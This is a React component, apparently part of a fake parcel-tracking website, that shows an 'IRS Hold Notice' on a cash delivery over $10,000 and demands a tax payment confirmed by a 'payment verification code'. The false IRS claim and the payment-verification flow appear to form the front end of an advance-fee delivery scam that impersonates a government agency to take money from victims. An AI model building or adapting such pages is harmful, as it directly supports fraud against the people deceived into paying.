"use client"

import type React from "react"

import { useState } from "react"
import { verifyIrsPayment } from "@/lib/actions"

export default function IrsHoldForm({
  trackingNumber,
  amount,
  verificationCode,
}: {
  trackingNumber: string
  amount: number
  verificationCode: string
}) {
  const [paymentCode, setPaymentCode] = useState<string>("")
  const [error, setError] = useState<string>("")
  const [showSuccessPopup, setShowSuccessPopup] = useState<boolean>(false)
  const [isLoading, setIsLoading] = useState<boolean>(false)

  const handlePayment = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    setIsLoading(true)
    setError("")

    try {
      const success = await verifyIrsPayment(trackingNumber, paymentCode)

      if (success) {
        setShowSuccessPopup(true)
        setTimeout(() => {
          setShowSuccessPopup(false)
          window.location.reload()
        }, 5000)
      } else {
        setError("Invalid verification code. Please check and try again.")
      }
    } catch (err) {
      setError("An error occurred while processing your payment. Please try again.")
      console.error(err)
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <>
      <div className="mb-8 bg-yellow-50 border border-yellow-200 rounded-xl p-6">
        <h3 className="text-xl font-semibold text-yellow-800 mb-4">IRS Hold Notice</h3>
        <p className="text-yellow-700 mb-4">
          Due to cash delivery amount exceeding $10,000.00, an IRS hold has been placed. Required tax payment: $
          {amount.toLocaleString()}
        </p>
        <form onSubmit={handlePayment} className="space-y-4">
          <div>
            <label htmlFor="payment" className="block text-sm font-medium text-yellow-700 mb-2">
              Payment Verification Code
            </label>
            <input
              type="text"
              id="payment"
              value={paymentCode}
              onChange={(e) => setPaymentCode(e.target.value)}
              className="w-full px-4 py-2 border border-yellow-300 rounded-lg focus:ring-2 focus:ring-yellow-500 focus:border-transparent"
              placeholder="Enter verification code"
              required
            />
          </div>
          <button
            type="submit"
            disabled={isLoading}
            className="w-full bg-yellow-500 text-white px-6 py-3 rounded-lg font-semibold hover:bg-yellow-600 transition-colors disabled:opacity-50"
          >
            {isLoading ? "Processing..." : "Submit Payment Verification"}
          </button>
        </form>
        {error && <div className="mt-4 text-red-600 text-sm">{error}</div>}
      </div>

      {showSuccessPopup && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white rounded-xl p-6 max-w-md mx-4">
            <div className="text-center">
              <div className="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-green-100 mb-4">
                <svg className="h-6 w-6 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <h3 className="text-lg font-medium text-gray-900 mb-2">Payment Verification in Progress</h3>
              <p className="text-sm text-gray-500">
                Your payment is being verified and the package status will be updated soon.
              </p>
            </div>
          </div>
        </div>
      )}
    </>
  )
}
